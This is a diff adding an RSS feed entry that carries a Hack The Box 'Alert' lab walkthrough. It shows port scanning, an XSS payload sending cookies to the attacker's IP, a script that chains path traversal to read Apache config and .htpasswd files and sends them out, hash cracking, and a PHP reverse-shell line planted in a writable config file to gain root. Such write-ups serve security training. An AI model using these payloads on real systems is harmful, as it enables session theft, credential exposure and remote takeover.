@@ -278,6 +278,150 @@ krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
         </item>
         
         <item>
+            <title>HTB: Alert Release Arena</title>
+            <link>https://v3l1d.github.io/posts/alert/</link>
+            <pubDate>Tue, 26 Nov 2024 00:00:00 +0000</pubDate>
+            
+            <guid>https://v3l1d.github.io/posts/alert/</guid>
+            <description>Port Scan # Nmap 7.94SVN scan initiated Tue Nov 26 17:13:16 2024 as: /usr/lib/nmap/nmap --privileged -sC -sV -A -T4 -o port_scan 10.129.68.51 Nmap scan report for 10.129.68.51 Host is up (0.083s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 (RSA) | 256 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 (ECDSA) |_ 256 cb:92:ad:6b:fc:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 (ED25519) 80/tcp open http Apache httpd 2.</description>
+            <content type="html"><![CDATA[<p><img src="attachment/d6657ac653fbaac0234f05d4af35f49d.png" alt=""></p>
+<h3 id="port-scan">Port Scan</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e"># Nmap 7.94SVN scan initiated Tue Nov 26 17:13:16 2024 as: /usr/lib/nmap/nmap --privileged -sC -sV -A -T4 -o port_scan 10.129.68.51</span>
+Nmap scan report <span style="color:#66d9ef">for</span> 10.129.68.51
+Host is up <span style="color:#f92672">(</span>0.083s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">3072</span> 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> cb:92:ad:6b:fc:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+80/tcp open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+|_http-title: Did not follow redirect to http://alert.htb/
+|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+Device type: general purpose
+Running: Linux 5.X
+OS CPE: cpe:/o:linux:linux_kernel:5.0
+OS details: Linux 5.0
+Network Distance: <span style="color:#ae81ff">2</span> hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE <span style="color:#f92672">(</span>using port 256/tcp<span style="color:#f92672">)</span>
+HOP RTT      ADDRESS
+<span style="color:#ae81ff">1</span>   82.05 ms 10.10.14.1
+<span style="color:#ae81ff">2</span>   82.72 ms 10.129.68.51
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<span style="color:#75715e"># Nmap done at Tue Nov 26 17:13:37 2024 -- 1 IP address (1 host up) scanned in 21.01 seconds</span>
+
+</code></pre></div><h3 id="enumeration">Enumeration</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Alert<span style="color:#f92672">]</span>
+└─$ ffuf -u http://alert.htb/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+------------------
+┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Downloads<span style="color:#f92672">]</span>
+└─$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://alert.htb:80/ -H <span style="color:#e6db74">&#39;Host: FUZZ.alert.htb&#39;</span> -fc <span style="color:#ae81ff">301</span> 
+</code></pre></div><p><img src="attachment/66228c6986c50a98896388dd46fb4f38.png" alt=""></p>
+<p><img src="attachment/3e99db7c16fa89cd7881b6f9bcd8c411.png" alt=""></p>
+<p><img src="attachment/0ff1f90ec311458c467ff1983ed9bf33.png" alt=""></p>
+<h3 id="xss">XSS</h3>
+<p>By <strong>Contact Us</strong> page we are able to perform XSS attack:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;http://10.10.14.72:8090?cookie=&#39;</span> <span style="color:#f92672">+</span> document.<span style="color:#a6e22e">cookie</span>);&lt;/<span style="color:#f92672">script</span>&gt;
+</code></pre></div><p><img src="attachment/fb83ae8d072b50c8decadbf1c5ff66c1.png" alt=""></p>
+<p>Put the below script in a <strong>.md</strong> file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
+  <span style="color:#75715e">// Fetch the content of the specified file
+</span><span style="color:#75715e"></span>  <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;http://alert.htb/messages.php?file=../../../../../../../etc/apache2/apache2.conf&#34;</span>)
+    .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">response</span> =&gt; <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">text</span>()) <span style="color:#75715e">// Convert the response to text
+</span><span style="color:#75715e"></span>    .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">data</span> =&gt; {
+      <span style="color:#75715e">// Send the fetched data to a specified server
+</span><span style="color:#75715e"></span>      <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;http://10.10.14.72:8888/?data=&#34;</span> <span style="color:#f92672">+</span> encodeURIComponent(<span style="color:#a6e22e">data</span>));
+    })
+    .<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">error</span> =&gt; <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#34;Error fetching the messages:&#34;</span>, <span style="color:#a6e22e">error</span>));
+<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+
+<span style="color:#75715e">&lt;!--</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://alert.htb/visualizer.php?link_share=674658646fa912.41675821.md&#34;</span><span style="color:#f92672">/&gt;</span> <span style="color:#f92672">--&gt;</span>
+</code></pre></div><p>Meanwhile start a python http server:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python <span style="color:#f92672">-</span>m http<span style="color:#f92672">.</span>server <span style="color:#ae81ff">8888</span>
+</code></pre></div><p>Then go to <strong>Contact Us</strong> page:</p>
+<p><img src="attachment/a52193d3f18d7809a6e50b7a962ece2c.png" alt=""></p>
+<p><img src="attachment/cdd35bee4acff7ccd34b801b04d00689.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-XML" data-lang="XML">%3Cpre%3E%3CVirtualHost%20*%3A80%3E%0A%20%20%20%20ServerName%20alert.htb%0A%0A%20%20%20%20DocumentRoot%20%2Fvar%2Fwww%2Falert.htb%0A%0A%20%20%20%20%3CDirectory%20%2Fvar%2Fwww%2Falert.htb%3E%0A%20%20%20%20%20%20%20%20Options%20FollowSymLinks%20MultiViews%0A%20%20%20%20%20%20%20%20AllowOverride%20All%0A%20%20%20%20%3C%2FDirectory%3E%0A%0A%20%20%20%20RewriteEngine%20On%0A%20%20%20%20RewriteCond%20%25%7BHTTP_HOST%7D%20!%5Ealert%5C.htb%24%0A%20%20%20%20RewriteCond%20%25%7BHTTP_HOST%7D%20!%5E%24%0A%20%20%20%20RewriteRule%20%5E%2F%3F(.*)%24%20http%3A%2F%2Falert.htb%2F%241%20%5BR%3D301%2CL%5D%0A%0A%20%20%20%20ErrorLog%20%24%7BAPACHE_LOG_DIR%7D%2Ferror.log%0A%20%20%20%20CustomLog%20%24%7BAPACHE_LOG_DIR%7D%2Faccess.log%20combined%0A%3C%2FVirtualHost%3E%0A%0A%3CVirtualHost%20*%3A80%3E%0A%20%20%20%20ServerName%20statistics.alert.htb%0A%0A%20%20%20%20DocumentRoot%20%2Fvar%2Fwww%2Fstatistics.alert.htb%0A%0A%20%20%20%20%3CDirectory%20%2Fvar%2Fwww%2Fstatistics.alert.htb%3E%0A%20%20%20%20%20%20%20%20Options%20FollowSymLinks%20MultiViews%0A%20%20%20%20%20%20%20%20AllowOverride%20All%0A%20%20%20%20%3C%2FDirectory%3E%0A%0A%20%20%20%20%3CDirectory%20%2Fvar%2Fwww%2Fstatistics.alert.htb%3E%0A%20%20%20%20%20%20%20%20Options%20Indexes%20FollowSymLinks%20MultiViews%0A%20%20%20%20%20%20%20%20AllowOverride%20All%0A%20%20%20%20%20%20%20%20AuthType%20Basic%0A%20%20%20%20%20%20%20%20AuthName%20%22Restricted%20Area%22%0A%20%20%20%20%20%20%20%20AuthUserFile%20%2Fvar%2Fwww%2Fstatistics.alert.htb%2F.htpasswd%0A%20%20%20%20%20%20%20%20Require%20valid-user%0A%20%20%20%20%3C%2FDirectory%3E%0A%0A%20%20%20%20ErrorLog%20%24%7BAPACHE_LOG_DIR%7D%2Ferror.log%0A%20%20%20%20CustomLog%20%24%7BAPACHE_LOG_DIR%7D%2Faccess.log%20combined%0A%3C%2FVirtualHost%3E%0A%0A%3C%2Fpre%3E%0A
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-XML" data-lang="XML"><span style="color:#f92672">&lt;pre&gt;&lt;VirtualHost</span> <span style="color:#960050;background-color:#1e0010">*:80</span><span style="color:#f92672">&gt;</span>
+    ServerName alert.htb
+    DocumentRoot /var/www/alert.htb
+    <span style="color:#f92672">&lt;Directory</span> <span style="color:#960050;background-color:#1e0010">/var/www/alert.htb</span><span style="color:#f92672">&gt;</span>
+        Options FollowSymLinks MultiViews
+        AllowOverride All
+    <span style="color:#f92672">&lt;/Directory&gt;</span>
+    RewriteEngine On
+    RewriteCond %{HTTP_HOST} !^alert\.htb$
+    RewriteCond %{HTTP_HOST} !^$
+    RewriteRule ^/?(.*)$ http://alert.htb/$1 [R=301,L]
+    ErrorLog ${APACHE_LOG_DIR}/error.log
+    CustomLog ${APACHE_LOG_DIR}/access.log combined
+<span style="color:#f92672">&lt;/VirtualHost&gt;</span>
+<span style="color:#f92672">&lt;VirtualHost</span> <span style="color:#960050;background-color:#1e0010">*:80</span><span style="color:#f92672">&gt;</span>
+    ServerName statistics.alert.htb
+    DocumentRoot /var/www/statistics.alert.htb
+    <span style="color:#f92672">&lt;Directory</span> <span style="color:#960050;background-color:#1e0010">/var/www/statistics.alert.htb</span><span style="color:#f92672">&gt;</span>
+        Options FollowSymLinks MultiViews
+        AllowOverride All
+    <span style="color:#f92672">&lt;/Directory&gt;</span>
+    <span style="color:#f92672">&lt;Directory</span> <span style="color:#960050;background-color:#1e0010">/var/www/statistics.alert.htb</span><span style="color:#f92672">&gt;</span>
+        Options Indexes FollowSymLinks MultiViews
+        AllowOverride All
+        AuthType Basic
+        AuthName &#34;Restricted Area&#34;
+        AuthUserFile /var/www/statistics.alert.htb/.htpasswd
+        Require valid-user
+    <span style="color:#f92672">&lt;/Directory&gt;</span>
+    ErrorLog ${APACHE_LOG_DIR}/error.log
+    CustomLog ${APACHE_LOG_DIR}/access.log combined
+<span style="color:#f92672">&lt;/VirtualHost&gt;</span>
+<span style="color:#f92672">&lt;/pre&gt;</span>
+
+</code></pre></div><p>Now repeat the procedure trying to acces <strong>.htpasswd</strong> file, replacing the path in the script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">http:<span style="color:#f92672">//</span>alert<span style="color:#f92672">.</span>htb<span style="color:#f92672">/</span>messages<span style="color:#f92672">.</span>php<span style="color:#960050;background-color:#1e0010">?</span>file<span style="color:#f92672">=../../../../../../../</span>var<span style="color:#f92672">/</span>www<span style="color:#f92672">/</span>statistics<span style="color:#f92672">.</span>alert<span style="color:#f92672">.</span>htb<span style="color:#f92672">/.</span>htpasswd
+</code></pre></div><p>After retriggering the XSS from Contact Us form we&rsquo;ll get:</p>
+<p><img src="attachment/0ce3ad006a392dc1ffbef62788e9a149.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTML" data-lang="HTML">%3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24i******************
+_______________
+DECODED: 
+&lt;<span style="color:#f92672">pre</span>&gt;albert:$apr1$*********Q/&lt;/<span style="color:#f92672">pre</span>&gt;
+</code></pre></div><p>Cracked it with haschat:</p>
+<p><img src="attachment/cfb06d3ecca98a143e24def872fd0428.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">albert:m********
+</code></pre></div><p>Login trough SSH into albert:</p>
+<p><img src="attachment/11d186566995b252209094ebcfe8f478.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">userflag:de185f1ff*******************
+</code></pre></div><h3 id="privilege-escalation">Privilege Escalation</h3>
+<p>From netsat we can see that there is a service running on port <strong>8080</strong></p>
+<p><img src="attachment/1f93c2b0faaa4ffaea0fe1e682483b78.png" alt=""></p>
+<p><img src="attachment/ffc9628049ccd5f84b8c7be1f07aa741.png" alt=""></p>
+<p><img src="attachment/6529bd7a5d44e49e4ff0cdaf0c3b5b03.png" alt=""></p>
+<p>The file <strong>/opt/website-monitor/config/configuration.php</strong> is writeable:</p>
+<p><img src="attachment/13f3b82f37651b33769179083c64c6a8.png" alt=""></p>
+<p>Add this line to <strong>configuration.php</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$sock<span style="color:#f92672">=</span>fsockopen<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;10.10.14.72&#34;</span>,9909<span style="color:#f92672">)</span>;shell_exec<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;</span><span style="color:#f92672">)</span>;
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">curl http://localhost:8080/config/configuration.php
+---------------------------------------------------
+┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+└─$ nc -lnvp <span style="color:#ae81ff">9909</span>
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9909</span> ...
+connect to <span style="color:#f92672">[</span>10.10.14.72<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.161.22<span style="color:#f92672">]</span> <span style="color:#ae81ff">59662</span>
+/bin/sh: 0: can<span style="color:#960050;background-color:#1e0010">&#39;</span>t access tty; job control turned off
+<span style="color:#75715e"># whoami</span>
+root
+<span style="color:#75715e"># ls</span>
+root.txt
+scripts
+<span style="color:#75715e"># cat root.txt  </span>
+</code></pre></div><p><img src="attachment/4ecc2194c78c07dbf8aa6e74d016a2d5.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">rootflag:238a5640d5acdd*****************
+</code></pre></div>]]></content>
+        </item>
+        
+        <item>
             <title>HTB: Trickster</title>
             <link>https://v3l1d.github.io/posts/trickster/</link>
             <pubDate>Tue, 12 Nov 2024 00:00:00 +0000</pubDate>
